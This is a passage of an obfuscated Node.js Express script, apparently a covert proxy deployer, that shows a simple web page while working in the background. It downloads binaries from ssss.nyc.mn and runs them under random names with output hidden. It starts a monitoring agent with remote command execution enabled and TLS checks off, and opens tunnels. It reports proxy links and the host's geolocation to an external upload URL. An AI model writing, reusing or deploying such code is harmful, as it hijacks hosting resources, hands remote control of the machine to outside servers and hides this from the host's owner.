const _0x9d43b2=_0x39fd;(function(_0xb08d86,_0x3af86e){const _0x457b29={_0x1eef6a:0x19a,_0x1f0e2b:0x1bb,_0x27da55:0x1dd,_0x19ceb4:0x1f7},_0x1c0118=_0x39fd,_0x56b673=_0xb08d86();while(!![]){try{const _0x46439b=parseInt(_0x1c0118(_0x457b29._0x1eef6a))/0x1+parseInt(_0x1c0118(0x1e8))/0x2*(-parseInt(_0x1c0118(0x147))/0x3)+-parseInt(_0x1c0118(0x179))/0x4+parseInt(_0x1c0118(0x149))/0x5*(parseInt(_0x1c0118(_0x457b29._0x1f0e2b))/0x6)+-parseInt(_0x1c0118(0x1aa))/0x7+-parseInt(_0x1c0118(_0x457b29._0x27da55))/0x8*(parseInt(_0x1c0118(_0x457b29._0x19ceb4))/0x9)+-parseInt(_0x1c0118(0x192))/0xa*(-parseInt(_0x1c0118(0x15f))/0xb);if(_0x46439b===_0x3af86e)break;else _0x56b673['push'](_0x56b673['shift']());}catch(_0x5f28d9){_0x56b673['push'](_0x56b673['shift']());}}}(_0x4382,0x55c02));const express=require('express'),app=express(),axios=require(_0x9d43b2(0x16e)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x9d43b2(0x1a0)),exec=promisify(require(_0x9d43b2(0x1ec))[_0x9d43b2(0x15d)]),{execSync}=require(_0x9d43b2(0x1ec)),UPLOAD_URL=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x162)]||'',PROJECT_URL=process[_0x9d43b2(0x1c8)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x187)]||![],FILE_PATH=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x189)]||_0x9d43b2(0x18a),SUB_PATH=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x16d)]||_0x9d43b2(0x1ef),PORT=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x1bc)]||process[_0x9d43b2(0x1c8)]['PORT']||0xbb8,UUID=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x1d4)]||_0x9d43b2(0x174),NEZHA_SERVER=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x1ac)]||'',NEZHA_PORT=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x1a2)]||'',NEZHA_KEY=process['env'][_0x9d43b2(0x1d7)]||'',ARGO_DOMAIN=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x188)]||'',ARGO_AUTH=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x1fb)]||'',ARGO_PORT=process[_0x9d43b2(0x1c8)]['ARGO_PORT']||0x1f41,CFIP=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x16c)]||_0x9d43b2(0x1e2),CFPORT=process['env']['CFPORT']||0x20fb,NAME=process[_0x9d43b2(0x1c8)][_0x9d43b2(0x198)]||'abc2026';!fs[_0x9d43b2(0x1c5)](FILE_PATH)?(fs[_0x9d43b2(0x183)](FILE_PATH),console[_0x9d43b2(0x1a5)](FILE_PATH+'\x20is\x20created')):console[_0x9d43b2(0x1a5)](FILE_PATH+_0x9d43b2(0x1ae));function generateRandomName(){const _0x1392f9={_0x37cfcb:0x1a4,_0x3fb89a:0x1f9,_0x2ad220:0x181},_0x29a826=_0x9d43b2,_0x3bbc65=_0x29a826(0x16a);let _0x144b8f='';for(let _0x10a8d9=0x0;_0x10a8d9<0x6;_0x10a8d9++){_0x144b8f+=_0x3bbc65[_0x29a826(_0x1392f9._0x37cfcb)](Math[_0x29a826(0x140)](Math[_0x29a826(_0x1392f9._0x3fb89a)]()*_0x3bbc65[_0x29a826(_0x1392f9._0x2ad220)]));}return _0x144b8f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x9d43b2(0x1b9)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x9d43b2(0x1b9)](FILE_PATH,webName),botPath=path[_0x9d43b2(0x1b9)](FILE_PATH,botName),subPath=path[_0x9d43b2(0x1b9)](FILE_PATH,_0x9d43b2(0x18f)),listPath=path[_0x9d43b2(0x1b9)](FILE_PATH,'list.txt'),bootLogPath=path[_0x9d43b2(0x1b9)](FILE_PATH,_0x9d43b2(0x193)),configPath=path['join'](FILE_PATH,_0x9d43b2(0x1bf));function deleteNodes(){const _0x41fc04={_0x383268:0x19e,_0x474af4:0x181,_0x5d1cfa:0x177},_0x287542=_0x9d43b2;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x89cad5;try{_0x89cad5=fs[_0x287542(_0x41fc04._0x383268)](subPath,_0x287542(0x176));}catch{return null;}const _0x48aabc=Buffer[_0x287542(0x159)](_0x89cad5,'base64')['toString'](_0x287542(0x176)),_0x267db6=_0x48aabc[_0x287542(0x180)]('\x0a')[_0x287542(0x166)](_0x5536e1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x287542(0x19f)](_0x5536e1));if(_0x267db6[_0x287542(_0x41fc04._0x474af4)]===0x0)return;return axios[_0x287542(0x1fa)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x287542(_0x41fc04._0x5d1cfa)]({'nodes':_0x267db6}),{'headers':{'Content-Type':_0x287542(0x169)}})['catch'](_0x59708c=>{return null;}),null;}catch(_0x177bb7){return null;}}function cleanupOldFiles(){const _0x4a0180={_0x53bb56:0x1a7,_0x3c16a8:0x1ea},_0x4fcbbe={_0x2ef241:0x1de,_0x4b8d67:0x185},_0x3c7080=_0x9d43b2;try{const _0x597621=fs[_0x3c7080(_0x4a0180._0x53bb56)](FILE_PATH);_0x597621[_0x3c7080(_0x4a0180._0x3c16a8)](_0x16a299=>{const _0x4be401=_0x3c7080,_0x5c1862=path[_0x4be401(0x1b9)](FILE_PATH,_0x16a299);try{const _0x5a0067=fs[_0x4be401(_0x4fcbbe._0x2ef241)](_0x5c1862);_0x5a0067[_0x4be401(_0x4fcbbe._0x4b8d67)]()&&fs[_0x4be401(0x175)](_0x5c1862);}catch(_0x5be7fb){}});}catch(_0x521277){}}app[_0x9d43b2(0x1b7)]('/',function(_0x1a493c,_0x372f8b){const _0x450802=_0x9d43b2;_0x372f8b[_0x450802(0x196)](_0x450802(0x1da));});async function generateConfig(){const _0x37dfb9={_0x333050:0x172,_0x2eb7a0:0x184,_0x58912c:0x1a6,_0x509801:0x1e6,_0x15f3c9:0x14f,_0x668211:0x158,_0x219bbc:0x144,_0x1d3770:0x1cb,_0x512ba6:0x1cc,_0x2388bf:0x1b5,_0x547d93:0x1b8,_0x4ed4e4:0x19d,_0x1a0bd0:0x14e,_0x326345:0x1be,_0x1a0833:0x1b9,_0x5cdff0:0x177},_0x37f925=_0x9d43b2,_0x416214={'log':{'access':_0x37f925(0x172),'error':_0x37f925(_0x37dfb9._0x333050),'loglevel':_0x37f925(0x1cc)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x37f925(0x1b6),'settings':{'clients':[{'id':UUID,'flow':_0x37f925(_0x37dfb9._0x2eb7a0)}],'decryption':_0x37f925(0x1cc),'fallbacks':[{'dest':0xbb9},{'path':_0x37f925(0x158),'dest':0xbba},{'path':_0x37f925(_0x37dfb9._0x58912c),'dest':0xbbb},{'path':_0x37f925(_0x37dfb9._0x509801),'dest':0xbbc}]},'streamSettings':{'network':_0x37f925(_0x37dfb9._0x15f3c9)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x37f925(0x1b6),'settings':{'clients':[{'id':UUID}],'decryption':_0x37f925(0x1cc)},'streamSettings':{'network':_0x37f925(_0x37dfb9._0x15f3c9),'security':_0x37f925(0x1cc)}},{'port':0xbba,'listen':_0x37f925(0x1cb),'protocol':_0x37f925(0x1b6),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x37f925(0x1cc)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x37f925(_0x37dfb9._0x668211)}},'sniffing':{'enabled':!![],'destOverride':[_0x37f925(0x1b5),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x37f925(0x1cb),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x37f925(0x1a6)}},'sniffing':{'enabled':!![],'destOverride':[_0x37f925(0x1b5),_0x37f925(_0x37dfb9._0x219bbc),_0x37f925(0x1b8)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x37f925(_0x37dfb9._0x1d3770),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x37f925(_0x37dfb9._0x512ba6),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x37f925(_0x37dfb9._0x2388bf),_0x37f925(0x144),_0x37f925(_0x37dfb9._0x547d93)],'metadataOnly':![]}}],'dns':{'servers':[_0x37f925(_0x37dfb9._0x4ed4e4)]},'outbounds':[{'protocol':_0x37f925(_0x37dfb9._0x1a0bd0),'tag':_0x37f925(_0x37dfb9._0x326345)},{'protocol':'blackhole','tag':_0x37f925(0x1f3)}]};fs['writeFileSync'](path[_0x37f925(_0x37dfb9._0x1a0833)](FILE_PATH,'config.json'),JSON[_0x37f925(_0x37dfb9._0x5cdff0)](_0x416214,null,0x2));}function getSystemArchitecture(){const _0x37eefa={_0x4922cf:0x16b,_0x3a0d47:0x1f8},_0x224c30=_0x9d43b2,_0x51d170=os[_0x224c30(_0x37eefa._0x4922cf)]();return _0x51d170===_0x224c30(0x1f8)||_0x51d170==='arm64'||_0x51d170===_0x224c30(0x1e0)?_0x224c30(_0x37eefa._0x3a0d47):_0x224c30(0x17a);}function downloadFile(_0x157986,_0x4d0038,_0x13decc){const _0xe8e882={_0x113ae3:0x1c5,_0x13935b:0x183,_0x527d93:0x1c0,_0x5140fb:0x1b2,_0x262715:0x17b},_0x2eaecd={_0x3a56c9:0x1a1,_0x280537:0x1f6},_0x3a639f={_0x55c457:0x153,_0x2d7bba:0x1f6},_0x1b7197={_0x55322b:0x145,_0x3356d0:0x1f1,_0x3f2d19:0x1a1,_0x3c0864:0x1f6},_0x4e677a=_0x9d43b2,_0x5207f8=_0x157986;!fs[_0x4e677a(_0xe8e882._0x113ae3)](FILE_PATH)&&fs[_0x4e677a(_0xe8e882._0x13935b)](FILE_PATH,{'recursive':!![]});const _0x5bd0db=fs[_0x4e677a(_0xe8e882._0x527d93)](_0x5207f8);axios({'method':'get','url':_0x4d0038,'responseType':_0x4e677a(0x1ba)})[_0x4e677a(_0xe8e882._0x5140fb)](_0x1c500c=>{const _0x2a0138=_0x4e677a;_0x1c500c[_0x2a0138(_0x3a639f._0x55c457)][_0x2a0138(0x1b1)](_0x5bd0db),_0x5bd0db['on'](_0x2a0138(0x173),()=>{const _0x2757a9=_0x2a0138;_0x5bd0db[_0x2757a9(0x1dc)](),console['log'](_0x2757a9(0x1f1)+path['basename'](_0x5207f8)+_0x2757a9(0x1c3)),_0x13decc(null,_0x5207f8);}),_0x5bd0db['on'](_0x2a0138(_0x3a639f._0x2d7bba),_0xa9060d=>{const _0x53b2ab=_0x2a0138;fs[_0x53b2ab(_0x1b7197._0x55322b)](_0x5207f8,()=>{});const _0x1bdb1f=_0x53b2ab(_0x1b7197._0x3356d0)+path[_0x53b2ab(_0x1b7197._0x3f2d19)](_0x5207f8)+'\x20failed:\x20'+_0xa9060d[_0x53b2ab(0x151)];console[_0x53b2ab(_0x1b7197._0x3c0864)](_0x1bdb1f),_0x13decc(_0x1bdb1f);});})[_0x4e677a(_0xe8e882._0x262715)](_0x37fd7a=>{const _0x4d818b=_0x4e677a,_0x3ec13a='Download\x20'+path[_0x4d818b(_0x2eaecd._0x3a56c9)](_0x5207f8)+_0x4d818b(0x1ad)+_0x37fd7a[_0x4d818b(0x151)];console[_0x4d818b(_0x2eaecd._0x280537)](_0x3ec13a),_0x13decc(_0x3ec13a);});}async function downloadFilesAndRun(){const _0x446435={_0x1dc519:0x181,_0x2f9d77:0x190,_0x7e78ca:0x167,_0x160642:0x1f6,_0x34e40f:0x171,_0x1d8423:0x165,_0x54d99d:0x180,_0x2c386f:0x15a,_0xc2c1cc:0x152,_0xec7bf0:0x14b,_0x42727f:0x1a5,_0x1398a3:0x1d3,_0x72a557:0x1f6,_0x3bd7a1:0x200,_0x426eab:0x1cf,_0x220062:0x1c4,_0x5c06a7:0x156,_0x56d22a:0x1a5,_0x49ecdd:0x1c2,_0x43a8de:0x13f,_0x211a97:0x160,_0x132476:0x1d3,_0x59e114:0x1d1},_0x3609d4=_0x9d43b2,_0x8b30d1=getSystemArchitecture(),_0x3033d7=getFilesForArchitecture(_0x8b30d1);if(_0x3033d7[_0x3609d4(_0x446435._0x1dc519)]===0x0){console[_0x3609d4(0x1a5)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x20e2bb=_0x3033d7[_0x3609d4(_0x446435._0x2f9d77)](_0x4d14f2=>{return new Promise((_0x5af6cd,_0x2e9f4c)=>{const _0x439781=_0x39fd;downloadFile(_0x4d14f2[_0x439781(0x1d5)],_0x4d14f2[_0x439781(0x1a8)],(_0x8494a0,_0x5d9433)=>{_0x8494a0?_0x2e9f4c(_0x8494a0):_0x5af6cd(_0x5d9433);});});});try{await Promise[_0x3609d4(_0x446435._0x7e78ca)](_0x20e2bb);}catch(_0x2b598f){console[_0x3609d4(_0x446435._0x160642)](_0x3609d4(_0x446435._0x34e40f),_0x2b598f);return;}function _0x5f3dc3(_0x188087){const _0x357efb={_0x25cb6c:0x1d0},_0x540512=_0x3609d4,_0x3f0cc4=0x1fd;_0x188087[_0x540512(0x1ea)](_0x3d2c90=>{const _0x481ae7=_0x540512;fs[_0x481ae7(0x1c5)](_0x3d2c90)&&fs[_0x481ae7(0x1e3)](_0x3d2c90,_0x3f0cc4,_0x1784f6=>{const _0x61a7d0=_0x481ae7;_0x1784f6?console['error'](_0x61a7d0(0x15b)+_0x3d2c90+':\x20'+_0x1784f6):console['log'](_0x61a7d0(_0x357efb._0x25cb6c)+_0x3d2c90+':\x20'+_0x3f0cc4['toString'](0x8));});});}const _0x588661=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5f3dc3(_0x588661);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12a2e7=NEZHA_SERVER[_0x3609d4(_0x446435._0x1d8423)](':')?NEZHA_SERVER[_0x3609d4(_0x446435._0x54d99d)](':')[_0x3609d4(0x143)]():'',_0x4cd8c5=new Set([_0x3609d4(0x148),'8443',_0x3609d4(_0x446435._0x2c386f),_0x3609d4(0x1d8),'2083',_0x3609d4(0x1c4)]),_0x4be101=_0x4cd8c5[_0x3609d4(0x1e7)](_0x12a2e7)?_0x3609d4(_0x446435._0xc2c1cc):_0x3609d4(0x1c9),_0x5ebf52=_0x3609d4(0x154)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3609d4(0x1db)+_0x4be101+_0x3609d4(0x1ee)+UUID;fs[_0x3609d4(_0x446435._0xec7bf0)](path['join'](FILE_PATH,'config.yaml'),_0x5ebf52);const _0x249bb8=_0x3609d4(0x160)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x3609d4(0x17c);try{await exec(_0x249bb8),console[_0x3609d4(_0x446435._0x42727f)](phpName+_0x3609d4(_0x446435._0x1398a3)),await new Promise(_0xccf041=>setTimeout(_0xccf041,0x3e8));}catch(_0x5088da){console[_0x3609d4(_0x446435._0x72a557)](_0x3609d4(_0x446435._0x3bd7a1)+_0x5088da);}}else{let _0x2f4503='';const _0x270eac=['443',_0x3609d4(_0x446435._0x426eab),_0x3609d4(0x15a),'2087','2083',_0x3609d4(_0x446435._0x220062)];_0x270eac[_0x3609d4(0x165)](NEZHA_PORT)&&(_0x2f4503='--tls');const _0x383c27=_0x3609d4(0x160)+npmPath+_0x3609d4(_0x446435._0x5c06a7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3609d4(0x18b)+NEZHA_KEY+'\x20'+_0x2f4503+_0x3609d4(0x1a9);try{await exec(_0x383c27),console[_0x3609d4(_0x446435._0x56d22a)](npmName+_0x3609d4(_0x446435._0x1398a3)),await new Promise(_0x3fc58a=>setTimeout(_0x3fc58a,0x3e8));}catch(_0x316af2){console['error'](_0x3609d4(0x197)+_0x316af2);}}}else console[_0x3609d4(0x1a5)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1d47a2=_0x3609d4(0x160)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1d47a2),console['log'](webName+_0x3609d4(0x1d3)),await new Promise(_0x268735=>setTimeout(_0x268735,0x3e8));}catch(_0x5cc116){console['error'](_0x3609d4(_0x446435._0x49ecdd)+_0x5cc116);}if(fs[_0x3609d4(0x1c5)](botPath)){let _0x4ebae9;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4ebae9=_0x3609d4(0x199)+ARGO_AUTH;else ARGO_AUTH[_0x3609d4(0x1e9)](/TunnelSecret/)?_0x4ebae9='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x3609d4(0x164):_0x4ebae9='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3609d4(_0x446435._0x43a8de)+ARGO_PORT;try{await exec(_0x3609d4(_0x446435._0x211a97)+botPath+'\x20'+_0x4ebae9+'\x20>/dev/null\x202>&1\x20&'),console[_0x3609d4(_0x446435._0x56d22a)](botName+_0x3609d4(_0x446435._0x132476)),await new Promise(_0x174b83=>setTimeout(_0x174b83,0x7d0));}catch(_0x211130){console['error'](_0x3609d4(_0x446435._0x59e114)+_0x211130);}}await new Promise(_0x560405=>setTimeout(_0x560405,0x1388));}function _0x39fd(_0x363f9e,_0x5a1513){const _0x43822e=_0x4382();return _0x39fd=function(_0x39fd66,_0x2f0355){_0x39fd66=_0x39fd66-0x13f;let _0x5be4bc=_0x43822e[_0x39fd66];return _0x5be4bc;},_0x39fd(_0x363f9e,_0x5a1513);}function getFilesForArchitecture(_0x5e4b18){const _0x252e4f={_0x51236e:0x194,_0x192b8f:0x1f2,_0x1015b8:0x1a3,_0x2d3e16:0x1f8,_0x4cf593:0x1eb},_0xe53a8d=_0x9d43b2;let _0x24815f;_0x5e4b18===_0xe53a8d(0x1f8)?_0x24815f=[{'fileName':webPath,'fileUrl':_0xe53a8d(_0x252e4f._0x51236e)},{'fileName':botPath,'fileUrl':_0xe53a8d(_0x252e4f._0x192b8f)}]:_0x24815f=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x40311d=_0x5e4b18===_0xe53a8d(0x1f8)?_0xe53a8d(_0x252e4f._0x1015b8):_0xe53a8d(0x1e1);_0x24815f[_0xe53a8d(0x1c1)]({'fileName':npmPath,'fileUrl':_0x40311d});}else{const _0x40ee89=_0x5e4b18===_0xe53a8d(_0x252e4f._0x2d3e16)?_0xe53a8d(_0x252e4f._0x4cf593):'https://amd64.ssss.nyc.mn/v1';_0x24815f['unshift']({'fileName':phpPath,'fileUrl':_0x40ee89});}}return _0x24815f;}function argoType(){const _0x17d69f={_0x379c7b:0x1a5,_0x3ef636:0x165,_0x5efff9:0x157,_0x1dbfae:0x1b9,_0x256352:0x180,_0x15c0a4:0x1b9,_0x525c89:0x141,_0x478fea:0x1c7},_0x17555f=_0x9d43b2;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x17555f(_0x17d69f._0x379c7b)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x17555f(_0x17d69f._0x3ef636)](_0x17555f(_0x17d69f._0x5efff9))){fs[_0x17555f(0x14b)](path[_0x17555f(_0x17d69f._0x1dbfae)](FILE_PATH,_0x17555f(0x170)),ARGO_AUTH);const _0x232c37=_0x17555f(0x1f4)+ARGO_AUTH[_0x17555f(_0x17d69f._0x256352)]('\x22')[0xb]+_0x17555f(0x1f5)+path[_0x17555f(_0x17d69f._0x15c0a4)](FILE_PATH,'tunnel.json')+_0x17555f(0x1b3)+ARGO_DOMAIN+_0x17555f(_0x17d69f._0x525c89)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x17555f(0x14b)](path[_0x17555f(_0x17d69f._0x15c0a4)](FILE_PATH,_0x17555f(_0x17d69f._0x478fea)),_0x232c37);}else console[_0x17555f(0x1a5)](_0x17555f(0x1df));}async function extractDomains(){const _0x437208={_0x8fba38:0x19e,_0x431f6f:0x1b9,_0xc22ec1:0x193,_0x30bd42:0x176,_0xaed711:0x1ea,_0x48bdf0:0x181,_0x3bff3c:0x1a5,_0xe3f79c:0x1fc,_0x5d2cbc:0x175,_0x16fed5:0x1b9,_0x46ed24:0x13f,_0xd1b287:0x1ed,_0x140736:0x1f6,_0x5bde75:0x163},_0x2138a2={_0x7abd5f:0x178,_0x131c96:0x153,_0x6130e:0x142,_0x3f5bc7:0x153,_0x1c5936:0x17d,_0x1108ed:0x142,_0x41be15:0x153,_0x23ba25:0x1b7,_0x2dff03:0x1e4,_0x340343:0x19c,_0x2dd14f:0x153},_0x1395e8={_0x1d4c7c:0x186,_0xea58de:0x19b},_0x1556e9=_0x9d43b2;let _0x573baf;if(ARGO_AUTH&&ARGO_DOMAIN)_0x573baf=ARGO_DOMAIN,console[_0x1556e9(0x1a5)]('ARGO_DOMAIN:',_0x573baf),await _0x53a327(_0x573baf);else try{const _0x26b318=fs[_0x1556e9(_0x437208._0x8fba38)](path[_0x1556e9(_0x437208._0x431f6f)](FILE_PATH,_0x1556e9(_0x437208._0xc22ec1)),_0x1556e9(_0x437208._0x30bd42)),_0x19ccb4=_0x26b318['split']('\x0a'),_0x50cb3b=[];_0x19ccb4[_0x1556e9(_0x437208._0xaed711)](_0x8fd265=>{const _0x2cd178=_0x1556e9,_0x1a21fc=_0x8fd265[_0x2cd178(0x1e9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1a21fc){const _0x30de7a=_0x1a21fc[0x1];_0x50cb3b[_0x2cd178(0x1b0)](_0x30de7a);}});if(_0x50cb3b[_0x1556e9(_0x437208._0x48bdf0)]>0x0)_0x573baf=_0x50cb3b[0x0],console[_0x1556e9(_0x437208._0x3bff3c)](_0x1556e9(_0x437208._0xe3f79c),_0x573baf),await _0x53a327(_0x573baf);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1556e9(_0x437208._0x5d2cbc)](path[_0x1556e9(_0x437208._0x16fed5)](FILE_PATH,'boot.log'));async function _0x40c861(){const _0x163347=_0x1556e9;try{process[_0x163347(0x168)]===_0x163347(0x182)?await exec(_0x163347(_0x1395e8._0x1d4c7c)+botName+_0x163347(0x195)):await exec(_0x163347(_0x1395e8._0xea58de)+botName['charAt'](0x0)+']'+botName[_0x163347(0x1ab)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x13f5b5){}}_0x40c861(),await new Promise(_0xca9a81=>setTimeout(_0xca9a81,0xbb8));const _0x506f2b=_0x1556e9(0x155)+FILE_PATH+_0x1556e9(_0x437208._0x46ed24)+ARGO_PORT;try{await exec(_0x1556e9(0x160)+botPath+'\x20'+_0x506f2b+_0x1556e9(_0x437208._0xd1b287)),console[_0x1556e9(_0x437208._0x3bff3c)](botName+_0x1556e9(0x1d3)),await new Promise(_0x238d51=>setTimeout(_0x238d51,0xbb8)),await extractDomains();}catch(_0x4025c4){console[_0x1556e9(_0x437208._0x140736)](_0x1556e9(0x1d1)+_0x4025c4);}}}catch(_0xf96564){console['error'](_0x1556e9(_0x437208._0x5bde75),_0xf96564);}async function _0x2d2d40(){const _0x1d34d5=_0x1556e9;try{const _0x50322c=await axios[_0x1d34d5(0x1b7)](_0x1d34d5(_0x2138a2._0x7abd5f),{'timeout':0xbb8});if(_0x50322c[_0x1d34d5(0x153)]&&_0x50322c[_0x1d34d5(_0x2138a2._0x131c96)][_0x1d34d5(_0x2138a2._0x6130e)]&&_0x50322c[_0x1d34d5(_0x2138a2._0x3f5bc7)][_0x1d34d5(_0x2138a2._0x1c5936)])return _0x50322c[_0x1d34d5(_0x2138a2._0x3f5bc7)][_0x1d34d5(_0x2138a2._0x1108ed)]+'_'+_0x50322c[_0x1d34d5(_0x2138a2._0x41be15)]['org'];}catch(_0x3f3963){try{const _0x3483fd=await axios[_0x1d34d5(_0x2138a2._0x23ba25)](_0x1d34d5(_0x2138a2._0x2dff03),{'timeout':0xbb8});if(_0x3483fd[_0x1d34d5(0x153)]&&_0x3483fd[_0x1d34d5(0x153)]['status']===_0x1d34d5(_0x2138a2._0x340343)&&_0x3483fd['data']['countryCode']&&_0x3483fd[_0x1d34d5(_0x2138a2._0x2dd14f)][_0x1d34d5(0x17d)])return _0x3483fd[_0x1d34d5(0x153)][_0x1d34d5(0x1ca)]+'_'+_0x3483fd['data'][_0x1d34d5(0x17d)];}catch(_0x170a34){}}return'Unknown';}async function _0x53a327(_0x55c7bb){const _0x5f32da={_0x1d442c:0x1cc,_0x5181df:0x144,_0x32508e:0x17e,_0x57de01:0x159,_0x4760ef:0x177,_0x59dd14:0x1c6,_0x315265:0x150,_0x59b17e:0x1a5,_0xbb54b8:0x1bd,_0x11878a:0x1a5,_0x4774db:0x1b7},_0x54e5c1=await _0x2d2d40(),_0xb3c044=NAME?NAME+'-'+_0x54e5c1:_0x54e5c1;return new Promise(_0x23a028=>{const _0x1d849f={_0x4f2ed1:0x1ff,_0x563a8d:0x196};setTimeout(()=>{const _0x37a334=_0x39fd,_0x12f87f={'v':'2','ps':''+_0xb3c044,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x37a334(_0x5f32da._0x1d442c),'net':'ws','type':_0x37a334(0x1cc),'host':_0x55c7bb,'path':_0x37a334(0x161),'tls':_0x37a334(_0x5f32da._0x5181df),'sni':_0x55c7bb,'alpn':'','fp':'firefox'},_0x20ef53='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x37a334(0x1cd)+_0x55c7bb+'&fp=firefox&type=ws&host='+_0x55c7bb+'&path=%2Fvless-argo%3Fed%3D2560#'+_0xb3c044+_0x37a334(_0x5f32da._0x32508e)+Buffer[_0x37a334(_0x5f32da._0x57de01)](JSON[_0x37a334(_0x5f32da._0x4760ef)](_0x12f87f))[_0x37a334(0x1f0)]('base64')+_0x37a334(0x1fd)+UUID+'@'+CFIP+':'+CFPORT+_0x37a334(_0x5f32da._0x59dd14)+_0x55c7bb+_0x37a334(_0x5f32da._0x315265)+_0x55c7bb+_0x37a334(0x14a)+_0xb3c044+_0x37a334(0x17f);console[_0x37a334(_0x5f32da._0x59b17e)](Buffer[_0x37a334(0x159)](_0x20ef53)['toString'](_0x37a334(_0x5f32da._0xbb54b8))),fs[_0x37a334(0x14b)](subPath,Buffer['from'](_0x20ef53)[_0x37a334(0x1f0)](_0x37a334(0x1bd))),console[_0x37a334(_0x5f32da._0x11878a)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x37a334(_0x5f32da._0x4774db)]('/'+SUB_PATH,(_0x27948e,_0x1f38cc)=>{const _0x19be7b=_0x37a334,_0x5a7480=Buffer['from'](_0x20ef53)[_0x19be7b(0x1f0)](_0x19be7b(0x1bd));_0x1f38cc[_0x19be7b(_0x1d849f._0x4f2ed1)](_0x19be7b(0x18d),_0x19be7b(0x1d6)),_0x1f38cc[_0x19be7b(_0x1d849f._0x563a8d)](_0x5a7480);}),_0x23a028(_0x20ef53);},0x7d0);});}}async function uploadNodes(){const _0x9841d8={_0x449eaa:0x169,_0x5dcc03:0x1a5,_0x4d48a9:0x1fe,_0x82a18b:0x1c5,_0x51bcd6:0x166,_0xe5b91c:0x181,_0x244d9a:0x177,_0x4ad48a:0x1fa,_0x2c1019:0x1ce},_0x33046f=_0x9d43b2;if(UPLOAD_URL&&PROJECT_URL){const _0x3f5342=PROJECT_URL+'/'+SUB_PATH,_0x4a1dd1={'subscription':[_0x3f5342]};try{const _0x8ab111=await axios['post'](UPLOAD_URL+_0x33046f(0x191),_0x4a1dd1,{'headers':{'Content-Type':_0x33046f(_0x9841d8._0x449eaa)}});return _0x8ab111&&_0x8ab111[_0x33046f(0x1fe)]===0xc8?(console[_0x33046f(_0x9841d8._0x5dcc03)](_0x33046f(0x1d9)),_0x8ab111):null;}catch(_0x2b4d94){if(_0x2b4d94['response']){if(_0x2b4d94[_0x33046f(0x18e)][_0x33046f(_0x9841d8._0x4d48a9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x33046f(_0x9841d8._0x82a18b)](listPath))return;const 